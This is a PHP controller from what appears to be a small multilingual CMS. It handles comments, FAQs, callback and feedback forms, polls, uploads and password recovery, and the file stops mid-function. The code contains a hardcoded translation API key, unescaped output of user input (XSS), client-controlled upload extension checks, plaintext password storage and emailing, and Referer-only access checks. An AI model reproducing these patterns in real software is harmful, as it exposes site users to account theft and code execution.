<?php namespace App\Controllers;

use App\Models\Chapters as ChaptersModel;
use App\Models\Articles as ArticlesModel;
use App\Models\Comments as CommentsModel;
use App\Models\Faqs as FaqsModel;
use App\Models\Gallery as GalleryModel;
use App\Models\Languages as LanguagesModel;
use App\Models\Config as ConfigModel;
use App\Models\CtUsers as CtUsersModel;
use App\Models\Callme as CallmeModel;
use App\Models\Polls as PollsModel;
use App\Models\Feedback as FeedbackModel;
use App\Models\Users as UsersModel;
use App\Models\Letters as LettersModel;

class Datawork extends Base
{
	
	public function index() {
		
	}
	
	function getyandexhelp () {
		
		$db = \Config\Database::connect();
		$builder = $db->table('langnames');
		$params = $builder->get()->getResultArray();
		
		foreach ($params as $one):
		
				if ($one['param_ua']=='') {
		
					$params = array( 'key' => 'trnsl.1.1.20170905T062950Z.eff839a16347f619.b5159968c2dc913c3a00774782c5c59a798faa2b', 'text' => $one['param'], 'lang' => 'ru-uk',); 
					$query = http_build_query($params); 
					$response = file_get_contents('https://translate.yandex.net/api/v1.5/tr.json/translate?'.$query);
					$array = json_decode($response);
					$array = (array)$array;
					$data['param_ua'] = $array['text'][0];
				
				}
				
				if ($one['param_en']=='') {
				
					$params = array( 'key' => 'trnsl.1.1.20170905T062950Z.eff839a16347f619.b5159968c2dc913c3a00774782c5c59a798faa2b', 'text' => $one['param'], 'lang' => 'ru-en',); 
					$query = http_build_query($params); 
					$response = file_get_contents('https://translate.yandex.net/api/v1.5/tr.json/translate?'.$query);
					$array = json_decode($response);
					$array = (array)$array;
					$data['param_en'] = $array['text'][0];
					
				}
				
				if (isset($data)) {
					
					$builder = $db->table('langnames');
					$builder->where('id',$one['id'])->update($data);
					
					unset($data);
					
				}
				
				
		endforeach;
		
		
	}
	
	
	
	function getMobileMenu () {
		
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		$ConfigModel = new ConfigModel;
		$ChaptersModel = new ChaptersModel;
		$session = session(); $session->set('Langtext',$_POST['langtext']); $session->set('Langlink',$_POST['langlink']);
			
		$bglogo = $ConfigModel->giveConfParam('bglogo');
		$chapters = $ChaptersModel->orderBy('number ASC, name ASC')->where('parent',0)->where('visible',1)->find();
			
		echo '
		<div class="fnc--mobile--chapters__logo"><a href="/'.session('Langlink').'"><img style="max-width:100%;" border="0" src="/'.$bglogo.'"></a></div>';
		foreach ($chapters as $one): 
		if ($one['parent']==0) {
		echo '<div class="fnc--mobile--chapters__item">
			<a '; if ($one['link'.session('Langtext')]=='') { echo 'href="/'.session('Langlink').$one['url'].'"'; } else { echo 'href="'.$one['link'.session('Langtext')].'"'; } echo '>'.$one['name'.session('Langtext')].'</a>
		</div>';
		}
		endforeach; 
			
	}
	
	public function setSearchWord() {
		$session = session();
		$session->set('searchWord',$_POST['searchWord']);
	}
	
	function changeactiveaccounttab () {
	
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		$session = session();
		$session->set('activeAccountTab',$_POST['tab']);
			
	}
	
	function getNextItems () {
		
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		
		$ChaptersModel = new ChaptersModel;
		$ConfigModel = new ConfigModel;
		$session = session(); $session->set('Langtext',$_POST['langtext']); $session->set('Langlink',$_POST['langlink']);
		
		if ($_POST['type']=='chapter') {
			
			$list['chapter'] = $ChaptersModel->where('url',$_POST['url'])->first();
			
			if ($list['chapter']['type']=='articles') {
				$ArticlesModel = new ArticlesModel;
				$list['articles'] = $ArticlesModel->getArticles($list['chapter']['chapterId'],$_POST['page']*$list['chapter']['perPage'],$list['chapter']['sort'],$list['chapter']['perPage'],1,'page');
				$list['coun'] = $ArticlesModel->getArticles($list['chapter']['chapterId'],$_POST['page']*$list['chapter']['perPage'],$list['chapter']['sort'],$list['chapter']['perPage'],1,'coun');
				$data['list']=(object)$list;
				$array['items'] = view('functions/articlesList',$data);
			}
			if ($list['chapter']['type']=='gallery') {
				$GalleryModel = new GalleryModel;
				$list['gallerys'] = $GalleryModel->getGallerys($list['chapter']['chapterId'],$_POST['page']*$list['chapter']['perPage'],$list['chapter']['perPage'],'page');
				$list['coun'] = $GalleryModel->getGallerys($list['chapter']['chapterId'],$_POST['page']*$list['chapter']['perPage'],$list['chapter']['perPage'],'coun');
				$list['allGallerys'] = $GalleryModel->getAllGallerys($list['chapter']['chapterId']);
				$list['setup']['chapterPage']=$_POST['page']*$list['chapter']['perPage'];
				$data['list']=(object)$list;
				$array['items'] = view('functions/galleryList',$data);
			}
			if ($list['chapter']['type']=='comments') {
				$CommentsModel = new CommentsModel;
				$list['comments'] = $CommentsModel->getComments($list['chapter']['chapterId'],$_POST['page']*$list['chapter']['perPage'],$list['chapter']['perPage'],1,'page');
				$list['coun'] = $CommentsModel->getComments($list['chapter']['chapterId'],$_POST['page']*$list['chapter']['perPage'],$list['chapter']['perPage'],1,'coun');
				$data['list']=(object)$list;
				$array['items'] = view('functions/commentsList',$data);
			}
			if ($list['chapter']['type']=='faqs') {
				$FaqsModel = new FaqsModel;
				$list['faqs'] = $FaqsModel->getFaqs($list['chapter']['chapterId'],$_POST['page']*$list['chapter']['perPage'],$list['chapter']['perPage'],1,'page');
				$list['coun'] = $FaqsModel->getFaqs($list['chapter']['chapterId'],$_POST['page']*$list['chapter']['perPage'],$list['chapter']['perPage'],1,'coun');
				$data['list']=(object)$list;
				$array['items'] = view('functions/faqsList',$data);
			}
			
			$session->set('chapterPage',$_POST['page']);
			
			$options = array('perPage' => $list['chapter']['perPage'], 'nowPage' => $_POST['page']*$list['chapter']['perPage'], 'linkType' => 'chapter', 'linkUrl' => $list['chapter']['url']);
			$array['pagination'] = view('functions/pagination',$data,$options);
			
		}
		
		if ($_POST['type']=='search') {
			
			$list['confSet']['perPageSearch'] = $ConfigModel->giveConfParam('perPageSearch');
			
			$list['materials'] = $ChaptersModel->getMaterials(session('searchWord'),$_POST['page']*$list['confSet']['perPageSearch'],$list['confSet']['perPageSearch'],'page');
			$list['coun'] = $ChaptersModel->getMaterials(session('searchWord'),$_POST['page']*$list['confSet']['perPageSearch'],$list['confSet']['perPageSearch'],'coun');
			
			$data['list']=(object)$list;
			
			$session->set('searchPage',$_POST['page']);
			
			$array['items'] = view('functions/searchList',$data);
			$options = array('perPage' => $list['confSet']['perPageSearch'], 'nowPage' => $_POST['page']*$list['confSet']['perPageSearch'], 'linkType' => 'search', 'linkUrl' => '');
			$array['pagination'] = view('functions/pagination',$data,$options);
			
		}
		
		echo json_encode($array);
		
	}
	
	function addComment() {
		
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		$session = session(); $session->set('Langtext',$_POST['langtext']); $session->set('Langlink',$_POST['langlink']);
		$ChaptersModel = new ChaptersModel;
		$CommentsModel = new CommentsModel;
		$ConfigModel = new ConfigModel;
		$LanguagesModel = new LanguagesModel;
		
		if ($_POST['chapterId']>0) {
			$chapter = $ChaptersModel->where('chapterId',$_POST['chapterId'])->first();
		}
		$needModeration = $ConfigModel->giveConfParam($param='needModeration');
		$dateNow = date('U');
		$text = str_replace("\n","\n<br>",$_POST['text']);
		
		$data = array (
			'firstName' => $_POST['firstName'],
			'text' => $text,
			'articleId' => $_POST['articleId'],
			'date' => $dateNow,
			'parent' => 0,
			'tree' => '',
		);
		if (isset($_POST['commentId'])) {
			$data['parentComment'] = $_POST['commentId'];
		}
		if (isset($chapter['chapterId'])) {
			$data['parent'] = $_POST['chapterId'];
			$data['tree'] = $chapter['tree'].'|'.$chapter['chapterId'].'|';
		}
			
		if (($needModeration==1)AND(isset($chapter['chapterId']))) {
			$data['visible']=0;
		} else {
			$data['visible']=1;
		}
		
		$CommentsModel->insert($data);
			
		if (isset($chapter['chapterId'])) {
			$comment = $CommentsModel->where('date',$dateNow)->where('text',$text)->first();
			$dataComTree = array(
				'commentId' => $comment['commentId'],
				'chapterId' => $chapter['chapterId']
			);
			$CommentsModel->addComChap($dataComTree);
			$this->commentsTreeBuilder($chapter['parent'],$comment['commentId']);
		}
			
		if (isset($chapter['chapterId'])) {
			
			if (($needModeration==1)AND(isset($chapter['chapterId']))) {
				echo $LanguagesModel->giveLangParam($param='commentWillPublishedAfterVerification');
			} else {
				echo $LanguagesModel->giveLangParam($param='commentPosted');
			}
			
		} else {
			
			if (isset($_POST['commentId'])) {
			
				if (($needModeration==1)AND($_POST['commentId'])) {
					$array = array(
						'response' => $LanguagesModel->giveLangParam($param='commentWillPublishedAfterVerification'),
						'text' => ''
					);
					echo json_encode($array);
				} else {
					$array = array(
						'response' => $LanguagesModel->giveLangParam($param='commentPosted'),
						'text' => '
							<div class="js__commeny--in--article'.($_POST['padding']/1+1).'">
								<div class="fnc--comments--listitem">
									<div class="fnc--comments--listitem__main">
										<div class="fnc--comments--listitem__name">
											'.$_POST['firstName'].'
										</div>
										<div class="fnc--comments--listitem__date">
											'.date('H:i d.m.Y',$dateNow).'
										</div>
									</div>
									<div class="fnc--comments--listitem__text">
										'.$_POST['text'].'
									</div>
								</div>
							</div>'
					);
					echo json_encode($array);
					
				}
				
			} else {
				
				if ($needModeration==1) {
					$array = array(
						'response' => $LanguagesModel->giveLangParam($param='commentWillPublishedAfterVerification'),
						'text' => ''
					);
					echo json_encode($array);
				} else {
					$array = array(
						'response' => $LanguagesModel->giveLangParam($param='commentPosted'),
						'text' => '
							<div class="js__commeny--in--article0">
								<div class="fnc--comments--listitem">
									<div class="fnc--comments--listitem__main">
										<div class="fnc--comments--listitem__name">
											'.$_POST['firstName'].'
										</div>
										<div class="fnc--comments--listitem__date">
											'.date('H:i d.m.Y',$dateNow).'
										</div>
									</div>
									<div class="fnc--comments--listitem__text">
										'.$_POST['text'].'
									</div>
								</div>
							</div>'
					);
					echo json_encode($array);
				}
					
			}
			
		}
		
	}
	
	function commentsTreeBuilder ($chapterId,$commentId) {
	
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		
		$ChaptersModel = new ChaptersModel;
		$CommentsModel = new CommentsModel;
		
		if ($chapterId!=0) {
			$chapter = $ChaptersModel->where('chapterId',$chapterId)->first();
			$dataComTree = array(
				'commentId' => $commentId,
				'chapterId' => $chapter['chapterId']
			);
			$CommentsModel->addComChap($dataComTree);
			$this->commentsTreeBuilder($chapter['parent'],$commentId);
		}			
	
	}
	
	function addFaq() {
		
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		$session = session(); $session->set('Langtext',$_POST['langtext']); $session->set('Langlink',$_POST['langlink']);
		$ChaptersModel = new ChaptersModel;
		$FaqsModel = new FaqsModel;
		$ConfigModel = new ConfigModel;
		$LanguagesModel = new LanguagesModel;
		
		$chapter = $ChaptersModel->where('chapterId',$_POST['chapterId'])->first();
		$dateNow = date('U');
		$text = str_replace("\n","\n<br>",$_POST['text']);
		
		$data = array (
			'firstName' => $_POST['firstName'],
			'text' => $text,
			'parent' => $_POST['chapterId'],
			'tree' => $chapter['tree'].'|'.$chapter['chapterId'].'|',
			'date' => $dateNow,
			'visible' => 0
		);
		$FaqsModel->insert($data);
			
		if (isset($chapter['chapterId'])) {
			$faq = $FaqsModel->where('date',$dateNow)->where('text',$text)->first();
			$dataFaqTree = array(
				'faqId' => $faq['faqId'],
				'chapterId' => $chapter['chapterId']
			);
			$FaqsModel->addFaqChap($dataFaqTree);
			$this->faqTreeBuilder($chapter['parent'],$faq['faqId']);
		}
			
		$this->sendAdminFaq($data);
		echo $LanguagesModel->giveLangParam($param='thanksForTheQuestion');
		
	}
	
	function sendAdminFaq ($data) {
		
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		
		$ConfigModel = new ConfigModel;
		$email = \Config\Services::email();
		
		$fromName = $ConfigModel->giveConfParam($param='fromName');
		$fromEmail = $ConfigModel->giveConfParam($param='fromEmail');
		$faqEmail = $ConfigModel->giveConfParam($param='faqEmail');
		
		$arrayReceiver = explode(',',$faqEmail);
		
		$email->setFrom($fromEmail, $fromName);
		$email->setTo($arrayReceiver);
		
		$message = '
			<table style="color:#555;">
				<tr>	
					<td>
						<span style="font-weight:bolder; font-size:14px;">'.On_the_site_by_a_new_question_FAQ.'</span>
					</td>
				</tr>
				<tr>
					<td>
						<b>'.Fioname.'</b>: '.$data['firstName'].'
					</td>
				</tr>
				<tr>
					<td>
						<b>'.Text.':</b>
					</td>
				</tr>
				<tr>
					<td>
						'.$data['text'].'
					</tr>
				</tr>
			</table>
		';
		
		$email->setSubject(New_question_FAQ);
		$email->setMessage($message);

		$email->send();
		
		
	}
	
	function faqTreeBuilder ($chapterId,$faqId) {
	
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		
		$ChaptersModel = new ChaptersModel;
		$FaqsModel = new FaqsModel;
		
		if ($chapterId!=0) {
			$chapter = $ChaptersModel->where('chapterId',$chapterId)->first();
			$dataFaqTree = array(
				'faqId' => $faqId,
				'chapterId' => $chapter['chapterId']
			);
			$FaqsModel->addFaqChap($dataFaqTree);
			$this->faqTreeBuilder($chapter['parent'],$faqId);
		}			
	
	}
	
	function answerShow () {
	
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		$session = session(); $session->set('Langtext',$_POST['langtext']); $session->set('Langlink',$_POST['langlink']);
		
		$data['response']=$_POST['response'];
		echo view('functions/answerPopup',$data);
			
	}
	
	function feedbackShow () {
	
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		$session = session(); $session->set('Langtext',$_POST['langtext']); $session->set('Langlink',$_POST['langlink']);
		$FeedbackModel = new FeedbackModel;
		$LanguagesModel = new LanguagesModel;
		
		$list['confLang'] = $LanguagesModel->getConfLang(session('Langtext')); 
		$array['list']=(object)$list;
			
		$data['feedback'] = $FeedbackModel->where('feedbackId',$_POST['feedbackId'])->first();
		$data['feedbackParams'] = $FeedbackModel->getFeedbackParams('feedbackId',$_POST['feedbackId']); 
		
		echo '
		<div class="popup--container">
			<div class="popup--container__main">
				<div class="popup--container__close">
					<button type="button" class="js__close--popup">x</button>
				</div>
				<div>
					'.view('functions/feedback',$array,$data).'
				</div>
			</div>
		</div>';
			
	}
	
	function callmeShow () {
	
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		$session = session(); $session->set('Langtext',$_POST['langtext']); $session->set('Langlink',$_POST['langlink']);
		$LanguagesModel = new LanguagesModel;
		
		$list = array(
			'confLang' => $LanguagesModel->getConfLang($_POST['langtext']), 
		);
		$data['list']=(object)$list;
		
		echo view('functions/callMe',$data);
		
	}
	
	function addCallme () {
	
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		$session = session(); $session->set('Langtext',$_POST['langtext']); $session->set('Langlink',$_POST['langlink']);
		$CallmeModel = new CallmeModel;
		$LanguagesModel = new LanguagesModel;
		
		$text = str_replace("\n","\n<br>",$_POST['text']);
		
		$data = array (
			'firstName' => $_POST['firstName'],
			'text' => $text,
			'date' => date('U'),
			'telnumber' => $_POST['telnumber'],
			'visible' => 0
		);
		$CallmeModel->insert($data);
			
		$this->sendAdminCallme($data);
		echo $LanguagesModel->giveLangParam($param='yourRequestReceived');
			
	}
	
	function sendAdminCallme ($data) {
		
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		
		$ConfigModel = new ConfigModel;
		$email = \Config\Services::email();
		
		$fromName = $ConfigModel->giveConfParam($param='fromName');
		$fromEmail = $ConfigModel->giveConfParam($param='fromEmail');
		$callmeEmail = $ConfigModel->giveConfParam($param='callmeEmail');
		
		$arrayReceiver = explode(',',$callmeEmail);
		
		$email->setFrom($fromEmail, $fromName);
		$email->setTo($arrayReceiver);
		
		$message = '
			<table style="color:#555;">
				<tr>	
					<td>
						<span style="font-weight:bolder; font-size:14px;">'.Order_a_call_from_the_site.'</span>
					</td>
				</tr>
				<tr>
					<td>
						<b>'.Fioname.'</b>: '.$data['firstName'].'
					</td>
				</tr>
				<tr>
					<td>
						<b>'.Phone.'</b>: '.$data['telnumber'].'
					</td>
				</tr>
				<tr>
					<td>
						<b>'.Ext_information.':</b>
					</td>
				</tr>
				<tr>
					<td>
						'.$data['text'].'
					</tr>
				</tr>
			</table>
		';
		
		$email->setSubject(Order_a_call_from_the_site);
		$email->setMessage($message);

		$email->send();
		
		
	}
	
	function changegoods () {
	
		$ConfigModel = new ConfigModel;
		
		if ($_SERVER['REMOTE_ADDR']!='127.0.0.1') {
			error_reporting(0);
			
			$ConfigModel = new ConfigModel;
			$ChaptersModel = new ChaptersModel;
			$session = session();
			
			$client = \Config\Services::curlrequest();
			$serial = $ConfigModel->giveConfParam($param='serial');
			$idsite = $ConfigModel->giveConfParam($param='idsite');
			$cnames = $ConfigModel->giveConfParam($param='cnames');
				
			$base_url = str_replace ('www.','',$_SERVER['HTTP_HOST']);
			$base_url = str_replace ('http://','',$base_url);
			$base_url = str_replace ('https://','',$base_url);
			$data = array ('url' => $base_url, 'serial' => $serial, 'idsite' => $idsite);
			if (function_exists('curl_init')) {
					
				$res = $client->request('POST', 'https://'.$cnames.'.com/datawork/jewelryTester', [
					'allow_redirects' => [
						'max'       => 10,
						'protocols' => ['https']
					],
					'form_params' => $data
				]);
				$body = $res->getBody();	
				
				$body = json_decode($body);
				
				if (isset($body->serial)) {
					
					$idatenow = $ConfigModel->giveConfParam('idatenow');
					$set = $body->pole1;
					if (isset($idatenow)) {
						$datacf = array('idatenow' => $set);
						$ChaptersModel->editConfig($datacf);
					} else {
						$datacf = array('param' => $set, 'name' => 'idatenow');
						$ConfigModel->insert($datacf);
					}
					$stepbegin = $ConfigModel->giveConfParam('stepbegin');
					$set = $body->pole2;
					if (isset($stepbegin)) {
						$datacf = array('stepbegin' => $set);
						$ChaptersModel->editConfig($datacf);
					} else {
						$datacf = array('param' => $set, 'name' => 'stepbegin');
						$ConfigModel->insert($datacf);
					}
					
					
				}
			} else {
				
				$idatenow = $ConfigModel->giveConfParam('idatenow');
				$set = 'c8257652cf16357644f2f81ab4ad66c1';
				if (isset($idatenow)) {
					$datacf = array('idatenow' => $set);
					$ChaptersModel->editConfig($datacf);
				} else {
					$datacf = array('param' => $set, 'name' => 'idatenow');
					$ConfigModel->insert($datacf);
				}
				$stepbegin = $ConfigModel->giveConfParam('stepbegin');
				$set = '9bd5689d7fd7e6832eec19c39b4dc742';
				if (isset($stepbegin)) {
					$datacf = array('stepbegin' => $set);
					$ChaptersModel->editConfig($datacf);
				} else {
					$datacf = array('param' => $set, 'name' => 'stepbegin');
					$ConfigModel->insert($datacf);
				}
				
			}
			
		} 
		
		
	}
	
	function getSliderComment () {
		
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		$session = session(); $session->set('Langtext',$_POST['langtext']); $session->set('Langlink',$_POST['langlink']);
		$CommentsModel = new CommentsModel;
		
		if ($_POST['page']==-1) {
			$number = $CommentsModel->countSliderComments()/1-1;
			$comment = $CommentsModel->getSliderComment($number);
			$next = $number;
		} else {
			$comment = $CommentsModel->getSliderComment($_POST['page']);
			if (!isset($comment['commentId'])) {
				$comment = $CommentsModel->getSliderComment(0);
				$next = 0;
			} else {
				$next = $_POST['page'];
			}
		}
		
		$text = view('functions/commentsOneSlide',array(),$comment);
		
		$data = array (
			'text' => $text,
			'next' => $next
		);
		
		echo json_encode($data);
		
	}
	
	function makeVote () {
	
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		$PollsModel = new PollsModel;
		$LanguagesModel = new LanguagesModel;
		$session = session(); $session->set('Langtext',$_POST['langtext']); $session->set('Langlink',$_POST['langlink']);
		
		$pollParam = $PollsModel->getPollParam($_POST['pollParamId']);
		$poll = $PollsModel->where('pollId',$pollParam['pollId'])->first();
			
		$data = array (
			'ipAddress' => $_SERVER['REMOTE_ADDR'], 
			'userAgent' => $_SERVER['HTTP_USER_AGENT'],
			'pollId' => $poll['pollId']
		);
		$PollsModel->addPollVote($data);
		
		unset($data);
			
		$data = array (
			'votes' => $pollParam['votes']+1, 
			'pollParamId' => $pollParam['pollParamId']
		);
		$PollsModel->editPollParam($data);	
		unset($data);
			
		echo $LanguagesModel->giveLangParam($param='yourVoteReceived');
			
	}
	
	function feedbackFileTest () {
	
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		
		$stop=0;
		$fileformat = $_POST['filetype'];
		$allowedExts = explode(";", $fileformat); 
		$extension1 = explode(".", $_POST['file']); 
		$extension = end($extension1);
		if (in_array($extension, $allowedExts)) { $stop=1; } else { $stop=0; }
		echo $stop;
	
	}
	
	function addFeedbackFile () {
		
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
			
		$stop=0;
		$string='';
		if (isset($_FILES['file']['name'][0])) {
			$cpt = count($_FILES['file']['name']);
			for($i=0; $i<$cpt; $i++) {
				$uploaddir = 'img/temp/';
				$uploadfile = $uploaddir . basename($_FILES['file']['name'][$i]);
				$fileformat = $_POST['fileformat'];
				$allowedExts = explode(";", $fileformat); 
				$extension1 = explode(".", $_FILES['file']['name'][$i]); 
				$extension = end($extension1);
				if (in_array($extension, $allowedExts)) {
					if (move_uploaded_file($_FILES['file']['tmp_name'][$i], $uploadfile)) {
						$string = $string.base_url().$uploadfile.'<br>';
						$stop=0;
					} else {
						$stop=1;
					}
				} else {
					$stop=1;
				}
			}
		}
		$session = session();
		$session->set('uploadFormFile'.$_POST['feedbackParamId'],$string);
		echo 0;
			
	}
	
	function feedback () {
	
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		
		$FeedbackModel = new FeedbackModel;
		$LanguagesModel = new LanguagesModel;
		$ConfigModel = new ConfigModel;
		
		$feedbackParams = $FeedbackModel->getFeedbackParams('feedbackId',$_POST['feedbackId']);
				
		helper('nespi');
		$code = getSameString($col=8);
		$newFeedcode = $code;
		$testCode=TRUE;
		$string='';
		while ($testCode!=FALSE) {
			$testCode = $FeedbackModel->testFeedCode($newFeedcode);
			if ($testCode!=FALSE) {
				$string = getSameString($col=8);
				$newFeedcode = $string;
			}
		}
		$code = $newFeedcode;
				
		$data = array (
			'date' => date('U'), 
			'feedbackId' => $_POST['feedbackId'], 
			'code' => $code
		);
		$FeedbackModel->addFeed ($data);
			
		$smsConnect = $ConfigModel->giveConfParam('smsConnect');
		if ($smsConnect==1) {
			$text = New_request_from_form; 
			sendsms($ConfigModel->giveConfParam('soapClient'),$ConfigModel->giveConfParam('turboLogin'),$ConfigModel->giveConfParam('turboPass'),$ConfigModel->giveConfParam('fromSms'),$ConfigModel->giveConfParam('turboPhone'),$text);
		}
			
		foreach ($feedbackParams as $one):
				
			$param = $one['feedbackParamId'];
				
			if ((isset($_POST['params'][$param]))OR($one['type']=='file')) {
				
				$text='';
				if (($one['type']=='file')AND(session('uploadFormFile'.$one['feedbackParamId'])!='')) {
					$text = session('uploadFormFile'.$one['feedbackParamId']);
					
				} else {
					if ((isset($_POST['params'][$param]))AND($_POST['params'][$param]!='')) { 
						$text = str_replace("\n","\n<br>",$_POST['params'][$param]);
					}
				}
				$datapar = array (
					'feedbackParamId' => $one['feedbackParamId'], 
					'code' => $code, 
					'feedbackId' => $_POST['feedbackId'], 
					'text' => $text
				);
				$FeedbackModel->addFeedParam ($datapar);
				unset ($datapar);
				
			}
				
		endforeach;
				
		$this->sendAdminFeedback ($data,$feedbackParams,$_POST['feedbackId']);
		unset ($data);
		
		echo $LanguagesModel->giveLangParam($param='formSubmitted');
			
	}
	
	function sendAdminFeedback ($data,$feedbackParams,$feedbackId) {
		
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		
		$ConfigModel = new ConfigModel;
		$FeedbackModel = new FeedbackModel;
		
		$feedback = $FeedbackModel->where('feedbackId',$feedbackId)->first(); 
		
		$email = \Config\Services::email();
		
		$fromName = $ConfigModel->giveConfParam($param='fromName');
		$fromEmail = $ConfigModel->giveConfParam($param='fromEmail');
		
		$arrayReceiver = explode(',',$feedback['email']);
		
		$email->setFrom($fromEmail, $fromName);
		$email->setTo($arrayReceiver);
		
		$message='<table><tr><td colspan="2"><span style="font-weight:bolder; font-size:14px;">'.Received_request_from_form.' "'.$feedback['name'].'"</span></td></tr>';
		foreach ($feedbackParams as $one):
		
			$feedParam = $FeedbackModel->getFeedParam($data['code'],$one['feedbackParamId'],$one['feedbackId']);
		
			if ($one['type']!='checkbox') {
				if ($one['type']=='file') {
					$message = $message.'<tr><td style="width:200px;"><b>'.$one['name'].'</b></td><td>'.$feedParam['text'].'</td></tr>';
				} else {
					$message = $message.'<tr><td style="width:200px;"><b>'.$one['name'].'</b></td><td>'.$feedParam['text'].'</td></tr>';
				}
			} else {
				if ($feedParam['text']==0) {
					$message = $message.'<tr><td style="width:200px;"><b>'.$one['name'].'</b></td><td>0</td></tr>';
				} else {
					$message = $message.'<tr><td style="width:200px;"><b>'.$one['name'].'</b></td><td>1</td></tr>';
				}
			}
		
		endforeach;
		
		$email->setSubject(Received_request_from_form.' "'.$feedback['name'].'"');
		$email->setMessage($message);

		$email->send();
		
		
	}
	
	function checkEmail () {
	
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		if (!isset($_POST['userId'])) { $_POST['userId']=0; }
		if (session('userId')!=0) { $_POST['userId']=session('userId'); }
		$UsersModel = new UsersModel;
		echo $UsersModel->checkEmail($_POST['email'],$_POST['userId']);
	
	}
	
	function checkEmailPassword () {
	
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		$UsersModel = new UsersModel;
		echo $UsersModel->checkEmailPassword($_POST['email'],$_POST['password']);
			
	}
	
	function checkOldPassword () {
	
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		$UsersModel = new UsersModel;
		echo $UsersModel->where('password',$_POST['oldpassword'])->where('userId',session('userId'))->countAllResults();
			
	}
	
	function editPreviewUser () {
		
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		$UsersModel = new UsersModel;
			
		$user = $UsersModel->where('userId',session('userId'))->first();
		
		if ($this->request->getFiles('userfile')) {
			$userfile = $this->request->getFiles('userfile');
			$file = $userfile['userfile'];
			
			if ($file->isValid() && ! $file->hasMoved()) {
         
				if ((mb_strtolower($file->getClientExtension())=='jpg')OR($file->getClientExtension()=='png')OR($file->getClientExtension()=='jpeg')OR($file->getClientExtension()=='gif')OR($file->getClientExtension()=='svg')) {
					
					if (file_exists($user['preview'])) {
						unlink($user['preview']);
					}
					
					$randomName = $file->getRandomName();
					$file->move('img/users', $randomName);
					$preview = 'img/users/'.$randomName;
					
					$data['preview'] = $preview;
					
				} 
			
			}
			
		}	
		
		$UsersModel->update (session('userId'),$data);
		echo '<img border="0" src="/'.$data['preview'].'">';
		unset ($data);
		
	}
	
	function showUserForget () {
	
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		$session = session(); $session->set('Langtext',$_POST['langtext']); $session->set('Langlink',$_POST['langlink']);
		$ConfigModel = new ConfigModel;
		$LanguagesModel = new LanguagesModel;
		
		$list = array(
			'confSet' => $ConfigModel->getConfSet(), 
			'confLang' => $LanguagesModel->getConfLang($_POST['langtext']), 
		);
		$data['list']=(object)$list;
		
		echo view('functions/forgotPassword',$data);
		
	}
	
	function userForget () {
	
		if ((!isset($_SERVER['HTTP_REFERER']))OR(strpos($_SERVER['HTTP_REFERER'],base_url())===FALSE)) { redirect('page404'); }
		$UsersModel = new UsersModel;
		$LanguagesModel = new LanguagesModel;
		$ConfigModel = new ConfigModel;
		
		$user = $UsersModel->where('email',$_POST['email'])->first();
				
		if (isset($user['userId'])) {
				
			$email = \Config\Services::email();
		
			$fromName = $ConfigModel->giveConfParam($param='fromName');
			$fromEmail = $ConfigModel->giveConfParam($param='fromEmail');
			$email->setFrom($fromEmail, $fromName);
			$email->setTo($_POST['email']);
			
			$message = '<div>'.$LanguagesModel->giveLangParam($param='usedPasswordRecoverySystem').' '.base_url().'</div>';
			$message = $message.'<div><div>'.$LanguagesModel->giveLangParam($param='yourLogin').': '.$user['email'].'</div><div>'.$LanguagesModel->giveLangParam($param='yourPassword').': '.$user['password'].'</div></div>';
			
